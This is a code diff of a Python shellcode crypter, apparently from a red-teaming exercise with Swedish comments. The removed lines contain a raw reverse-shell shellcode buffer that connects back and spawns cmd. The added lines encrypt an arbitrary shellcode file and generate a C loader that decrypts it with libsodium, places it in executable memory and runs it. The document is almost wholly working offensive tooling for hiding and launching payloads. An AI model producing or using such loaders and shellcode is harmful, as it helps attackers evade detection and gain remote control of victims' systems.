@@ -1,66 +1,77 @@
-"""Avancerat alternativ:
-Skapa ett script som krypterar shellcode
-Sedan genererar en nyckel och  krypterad shellcode som char arrays för användning i C.
-Nyckeln ska sedan kunna användas för att dekryptera shellcoden i ett c-program
-"""
-
-# https://medium.com/@lsecqt/red-teaming-101-executing-malicious-shellcode-with-c-a-guide-for-beginners-439bff63721d
-
-"""
-    Which means I need to:
-- Generate a key (either using PBKDF2 or randomly)
-- Use that key to encrypt the buffer
-- Save the encrypted buffer in the format of a c array
-- Save the key as a char array
-- Save both the encrypted buffer and key in a .c file
-"""
 import cryptonite
 
-key = "fndyoazVe7co_-6kM7argIvbA-xwJ_pzAIE34rgMVoI="
+def encrypt_shellcode():
+    key = cryptonite.generate_key()
+    shellcode_file = input("Filename: ")
+    encrypted_data = cryptonite.encrypt_file(shellcode_file, key)
+    data_c_array = cryptonite.bytes_to_c_array(encrypted_data)
+    key_c_array = cryptonite.bytes_to_c_array(key)
 
-buf =  b""
-buf += b"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64"
-buf += b"\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28"
-buf += b"\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c"
-buf += b"\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52"
-buf += b"\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
-buf += b"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49"
-buf += b"\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
-buf += b"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75"
-buf += b"\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b"
-buf += b"\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
-buf += b"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a"
-buf += b"\x8b\x12\xeb\x8d\x5d\x68\x33\x32\x00\x00\x68\x77"
-buf += b"\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
-buf += b"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x29\x80\x6b"
-buf += b"\x00\xff\xd5\x50\x50\x50\x50\x40\x50\x40\x50\x68"
-buf += b"\xea\x0f\xdf\xe0\xff\xd5\x97\x6a\x05\x68\x7f\x00"
-buf += b"\x00\x01\x68\x02\x00\x1f\x40\x89\xe6\x6a\x10\x56"
-buf += b"\x57\x68\x99\xa5\x74\x61\xff\xd5\x85\xc0\x74\x0c"
-buf += b"\xff\x4e\x08\x75\xec\x68\xf0\xb5\xa2\x56\xff\xd5"
-buf += b"\x68\x63\x6d\x64\x00\x89\xe3\x57\x57\x57\x31\xf6"
-buf += b"\x6a\x12\x59\x56\xe2\xfd\x66\xc7\x44\x24\x3c\x01"
-buf += b"\x01\x8d\x44\x24\x10\xc6\x00\x44\x54\x50\x56\x56"
-buf += b"\x56\x46\x56\x4e\x56\x56\x53\x56\x68\x79\xcc\x3f"
-buf += b"\x86\xff\xd5\x89\xe0\x4e\x56\x46\xff\x30\x68\x08"
-buf += b"\x87\x1d\x60\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6"
-buf += b"\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0"
-buf += b"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5"
+    c_template = create_c_template(data_c_array, key_c_array)
+    
+    cryptonite.write_to_file("shell.c", c_template, "w")
+    print("C code has been written to shell.c")
 
-encrypted_buf = cryptonite.encrypt_data(buf, key)
-len_of_encrypted_buf = len(encrypted_buf)
-len_of_key = len(key)
-key_c_array = f"char key[{len_of_key}] = \"{key}\""
-encrypted_buf_c_array = f"char buf[{len_of_encrypted_buf}] = \"{encrypted_buf.decode("ascii")}\""
-print(key_c_array)
+def create_c_template(encrypted_data_array, key_array):
+    """Generate the C template code with the encrypted data and key."""
+    template = f"""
+#include <stdio.h>
+#include <string.h>
+#include <stdlib.h>
+#include <sodium.h>
+#include <sys/mman.h>
 
+int main() {{
+    // Initialize libsodium
+    if (sodium_init() < 0) {{
+        return 1; // Panic
+    }}
 
-print(encrypted_buf_c_array)
+    // Define the encrypted data (including nonce and ciphertext)
+    unsigned char encrypted_data[] = {{ {encrypted_data_array} }};
+    unsigned int encrypted_data_len = sizeof(encrypted_data);
 
+    // Key
+    unsigned char key_bytes[] = {{ {key_array} }};
 
+    // Extract nonce from the encrypted data (first 24 bytes)
+    unsigned char nonce[crypto_secretbox_NONCEBYTES];
+    memcpy(nonce, encrypted_data, crypto_secretbox_NONCEBYTES);
 
+    // Prepare to decrypt
+    unsigned char decrypted[encrypted_data_len - crypto_secretbox_MACBYTES]; // MAC size to subtract
+    if (crypto_secretbox_open_easy(decrypted, encrypted_data + crypto_secretbox_NONCEBYTES, 
+                                    encrypted_data_len - crypto_secretbox_NONCEBYTES, nonce, key_bytes) != 0) {{
+        // Decryption failed
+        printf("Decryption failed!\\n");
+        return 1;
+    }}
 
-c_file_template = f"""
+    // Allocate executable memory
+    void *exec_mem = mmap(NULL, sizeof(decrypted), PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+    if (exec_mem == MAP_FAILED) {{
+        perror("mmap");
+        return 1;
+    }}
+
+    // Copy decrypted shellcode to executable memory
+    memcpy(exec_mem, decrypted, sizeof(decrypted));
+
+    // Execute shellcode
+    void (*shellcode)() = exec_mem; // Cast the memory to a function pointer
+    shellcode(); // Execute the shellcode
+
+    // Clean up
+    munmap(exec_mem, sizeof(decrypted));
+    
+    return 0;
+}}
+
 """
+    return template
 
-cryptonite.write_to_file("test.c", c_file_template)
+def main():
+    encrypt_shellcode()
+
+if __name__ == "__main__":
+    main()
